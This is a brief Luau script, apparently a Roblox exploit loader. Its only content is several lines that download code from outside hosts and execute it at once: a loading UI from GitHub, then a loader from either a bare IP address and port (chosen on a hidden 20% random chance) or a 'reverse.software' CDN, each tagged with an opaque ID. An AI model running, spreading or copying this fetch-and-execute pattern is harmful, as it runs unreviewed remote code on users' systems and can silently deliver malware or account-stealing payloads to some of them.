loadstring(game:HttpGet("https://raw.githubusercontent.com/Ilusion-scripts/Loading-UI/main/loading"))()


local chance = math.random(1, 100)

if chance <= 20 then
    ID="d98f46c5-df0d-4ba3-9db0-61244be7c8e6";
    loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))() 
else
    ID="165ea1a9-9f58-4324-a40e-cc3dd6ea7494"; loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end
